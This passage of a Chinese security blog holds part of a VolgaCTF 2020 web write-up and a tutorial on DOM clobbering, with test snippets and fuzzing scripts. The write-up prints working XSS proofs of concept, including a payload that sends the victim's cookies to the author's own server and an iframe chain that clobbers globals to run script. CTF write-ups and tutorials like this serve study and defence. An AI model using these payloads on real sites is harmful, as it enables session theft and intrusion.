class="string">"/profile.html"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        profile(data.user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"/"</span>,</span><br><span class="line">        <span class="string">"/index.html"</span>,</span><br><span class="line">        <span class="string">"/profile.html"</span>,</span><br><span class="line">        <span class="string">"/report.php"</span>,</span><br><span class="line">        <span class="string">"/editprofile.html"</span></span><br><span class="line">    ].includes(location.pathname)</span><br><span class="line">) &#123;</span><br><span class="line">    getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面代码 可分析得在path有上面数组中的任意一个，将传第guid参数给getUser，那我们只要给guid一个?就可以了</p>
<p>最终exp</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.cookie = <span class="string">"api_server=exploit.lihuaiqiu.top\x77; domain=volgactf-task.ru;"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.location = <span class="string">'https://volgactf-task.ru/report.php?guid=?'</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<a href="https://exploit.lihuaiqiu.top放上构造好的xss语句" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top放上构造好的xss语句</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;<span class="string">"test"</span>:<span class="built_in">window</span>.location=<span class="string">'vps'</span>+<span class="built_in">document</span>.location&#125;);</span><br></pre></td></tr></table></figure>

<p>自己vps监听下即可收到cookie</p>
<p><img src="https://s1.ax1x.com/2020/03/31/Gl8ggJ.png" alt="Gl8ggJ.png"></p>
<p>当然还有另一种更有趣的回调操作</p>
<p>俄罗斯带哥找到了回溯的正则表达，膜，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;  1.7.2 &#x2F;(&#x3D;)\?(?&#x3D;&amp;|$)|\?\?&#x2F;</span><br><span class="line">&lt;&#x3D; 1.7.2 &#x2F;(\&#x3D;)\?(&amp;|$)|\?\?&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.5.1 &#x2F;(\&#x3D;)\?(&amp;|$)|()\?\?()&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.4.4 &#x2F;\&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.4.2 &#x2F;&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.2.1 &#x2F;&#x3D;(\?|%3F)&#x2F;g</span><br><span class="line">&lt;  1.2   not supported</span><br></pre></td></tr></table></figure>

<p>所以我们完全可以不用考虑guid的传值，直接进行回调，并且??后面是可以接受任意其他字符的，如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/01/GldVl8.png" alt="GldVl8.png"></p>
<p>都可成功回调</p>
<h3 id="VolgaCTF-Archive"><a href="#VolgaCTF-Archive" class="headerlink" title="VolgaCTF Archive"></a>VolgaCTF Archive</h3><p>蛮有趣的一道题</p>
<p>主要代码如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/pages.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  $(<span class="built_in">window</span>).on(<span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line">    volgactf.activePage.location=location.hash.slice(1);</span><br><span class="line">    if(volgactf.pages[volgactf.activePage.location]) &#123;</span><br><span class="line"><span class="javascript">      $(<span class="string">'#page'</span>).attr(<span class="string">'src'</span>,volgactf.pages[volgactf.activePage.location]);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.active'</span>).removeClass(<span class="string">'active'</span>);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.nav-item &gt; a:contains('</span>+volgactf.activePage.location+<span class="string">')'</span>).addClass(<span class="string">'active'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="javascript">  $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span>(location.hash.slice(<span class="number">1</span>) != <span class="string">'2019'</span>) &#123;</span></span><br><span class="line"><span class="javascript">      $(<span class="built_in">window</span>).trigger(<span class="string">'hashchange'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>page.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">volgactf = &#123;</span><br><span class="line">pages: &#123;</span><br><span class="line"><span class="string">'2011'</span>: <span class="string">'./html/2011.html'</span>,</span><br><span class="line"><span class="string">'2012'</span>: <span class="string">'./html/2012.html'</span>,</span><br><span class="line"><span class="string">'2013'</span>: <span class="string">'./html/2013.html'</span>,</span><br><span class="line"><span class="string">'2014'</span>: <span class="string">'./html/2014.html'</span>,</span><br><span class="line"><span class="string">'2015'</span>: <span class="string">'./html/2015.html'</span>,</span><br><span class="line"><span class="string">'2016'</span>: <span class="string">'./html/2016.html'</span>,</span><br><span class="line"><span class="string">'2017'</span>: <span class="string">'./html/2017.html'</span>,</span><br><span class="line"><span class="string">'2018'</span>: <span class="string">'./html/2018.html'</span>,</span><br><span class="line"><span class="string">'2019'</span>: <span class="string">'./html/2019.html'</span></span><br><span class="line">&#125;,</span><br><span class="line">activePage: &#123;</span><br><span class="line">location: <span class="number">2019</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>主要代码逻辑就是通过对page.js的加载更改location.hash切换页面</p>
<p>如果我们可以将 volgactf.activePage.location的值替换为javascript:alert(1)的话，即可造成xss攻击</p>
<p>所以目前要做的就是将volgactf.active覆盖为一个window对象，对于覆盖的实现可以使用Dom clobbering进行覆盖，不过volgactf.active在题目中已经是一个被声明的变量了，我们需要使这个变量变成未定义的状态，在旧版本的chrome中可以通过xss-auditor进行变量移除，不过在新版本中已经被删掉了。</p>
<p>但是在这个题目中可以通过另外的方式使得此变量变成未定义的模式，此变量的获取是通过page.js进行变量赋值的，我们可以通过一些手段使得Page.js无法成功加载达到此目的</p>
<p>大概有两种方法，如下：</p>
<ul>
<li>Nginx与浏览器的解析差异问题</li>
</ul>
<p>对于<a href="https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage</a></p>
<ul>
<li>通过斜线构造超长URL</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;              200 OK</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;js&#x2F;main.js    414 Request-URI Too Large</span><br></pre></td></tr></table></figure>

<p>触发414，同样无法成功加载page.js，进而得到未定义的volgactf.activePage</p>
<p>回归本体的攻击思路</p>
<ul>
<li>首先通过iframe引入<a href="https://archive.q.2020.volgactf.ru/x/..%2F（子页面）" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F（子页面）</a></li>
<li>构造frames[0].frames[0].location构造孙页面</li>
<li>孙页面的iframe设置name为activePage,并且将此页面的window.name设置为volgactf，此时相当于成功污染子页面的volgactf变量，最后将volgactf.activePage设置为与题目同域的window对象</li>
</ul>
<p>最后的利用Poc如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">  frames[<span class="number">0</span>].frames[<span class="number">0</span>].location=<span class="string">'data:text/html;base64,PGlmcmFtZSBuYW1lPWFjdGl2ZVBhZ2Ugc3JjPWh0dHBzOi8vYXJjaGl2ZS5xLjIwMjAudm9sZ2FjdGYucnUvP2FhYT48L2lmcmFtZT48c2NyaXB0PndpbmRvdy5uYW1lPSd2b2xnYWN0Zic7PC9zY3JpcHQ+'</span>;</span></span><br><span class="line"><span class="actionscript">  setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;frames[<span class="number">0</span>].location=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f#javascript:alert(document.domain)'</span>&#125;,<span class="number">1000</span>)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/04/22/VolgaCTF-2020-Qualifier-Web/" data-id="ckabsu38t002jkkvr9ymf3f3r" class="article-share-link" data-share="baidu" data-title="VolgaCTF 2020 Qualifier-Web">Share</a>
      

      
        <a href="http://yoursite.com/2020/04/22/VolgaCTF-2020-Qualifier-Web/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-DOM-Clobbering-Attack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/15/DOM-Clobbering-Attack/" class="article-date">
  <time datetime="2020-04-15T07:09:48.000Z" itemprop="datePublished">2020-04-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Dom-Clobbering-Attack概述"><a href="#Dom-Clobbering-Attack概述" class="headerlink" title="Dom Clobbering Attack概述"></a>Dom Clobbering Attack概述</h3><p>大概简述下这个技术的主要攻击手法：</p>
<p>通过标签中定义的name和id属性进行全局变量覆盖或劫持，进而造成其他通过全局变量实现效果的代码出现可控情况，造成漏洞。</p>
<h4 id="简单了解下id与name"><a href="#简单了解下id与name" class="headerlink" title="简单了解下id与name"></a>简单了解下id与name</h4><p><img src="https://s1.ax1x.com/2020/04/12/GO03h6.png" alt="GO03h6.png"></p>
<p>通过这种方式我们实现了全局变量的声明，不过有一点需要注意的是id无法通过document来获取，不过可以通过document.getElementById(‘test1’)或者document.querySelector(‘test1’)进行获取.</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="字符串的强制转换"><a href="#字符串的强制转换" class="headerlink" title="字符串的强制转换"></a>字符串的强制转换</h4><p>在利用时需要考虑两个问题：</p>
<p>第一个问题是：我们通过Dom clobbering覆盖的变量的值均是标签，也就是说都是一个HTMLElement对象，但是在实际应用的时候，很多时候变量都是按照字符串进行操作的，比如上面的例子中，如果直接进行字符串强制类型转换，将会产生下面的结果：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1)  <span class="comment">//[object HTMLImageElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以说我们需要找到即使被字符串强制类型转换后也能使用的标签，可利用如下代码进行下fuzz</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>)</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p.match(<span class="regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">window</span>[p])</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure>

<p>结果为得到HTMLAnchorElement和HTMLAreaElement.也就是对应了a标签和area标签</p>
<p>通过下面代码对这两个标签进行下测试</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">href</span>=<span class="string">"http://test1"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">area</span> <span class="attr">id</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"http://test2"</span>&gt;</span><span class="tag">&lt;/<span class="name">area</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1) <span class="comment">// 返回结果http://test1</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test2) <span class="comment">// 返回结果http://test2</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面的测试结果来看a标签和area标签如果进行toString强制转换的时候，是会返回其href属性的value的</p>
<p>这里给下篇文章留个坑吧（可能是一篇关于Spidermonkey分析native code的文章）</p>
<h4 id="属性的访问"><a href="#属性的访问" class="headerlink" title="属性的访问"></a>属性的访问</h4><p>在javascript中属性的访问并不只有简单的x这种，更有a.b，a.b.c，甚至a.b.c.d这种的访问形式，下面的探讨就是对于这样问题的解决</p>
<h5 id="两层访问"><a href="#两层访问" class="headerlink" title="两层访问"></a>两层访问</h5><h6 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h6><p>第一种方法可以通过HTMLCollection的创建来实现两层访问</p>
<p>我们可以通过相同id的标签创建来实现HTMLCollection的创建，如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test3.test4) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="Fuzz-Html-Tags"><a href="#Fuzz-Html-Tags" class="headerlink" title="Fuzz Html Tags"></a>Fuzz Html Tags</h6><p>在不构建HTMLCollection情况下，可以通过直接fuzz标签的关系，来确定是否可层级访问</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> log=[];</span><br><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>], logs = [];</span><br><span class="line">div=<span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;html.length;i++) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;html.length;j++) &#123;</span><br><span class="line">    div.innerHTML=<span class="string">'&lt;'</span>+html[i]+<span class="string">' id=element1&gt;'</span>+<span class="string">'&lt;'</span>+html[j]+<span class="string">' id=element2&gt;'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.element1 &amp;&amp; element1.element2)&#123;</span><br><span class="line">       log.push(html[i]+<span class="string">','</span>+html[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log.join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>可得到如下关系</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form,button</span><br><span class="line">form,fieldset</span><br><span class="line">form,image</span><br><span class="line">form,img</span><br><span class="line">form,input</span><br><span class="line">form,object</span><br><span class="line">form,output</span><br><span class="line">form,select</span><br><span class="line">form,textarea</span><br></pre></td></tr></table></figure>

<p>测试代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>不过这种是无法触发字符串的访问的，相对上种方法更局限一些</p>
<h5 id="三层访问"><a href="#三层访问" class="headerlink" title="三层访问"></a>三层访问</h5><p>对于三层的访问来讲，其实就是两种两层访问方法的叠加</p>
<p>测试代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(test1.test2.test3) <span class="comment">//&lt;button id=test3&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到返回结果为上面声明的id为test3的button标签</p>
<h5 id="三层以上访问"><a href="#三层以上访问" class="headerlink" title="三层以上访问"></a>三层以上访问</h5><p>三层以上的访问可以通过iframe与srcdoc来实现</p>
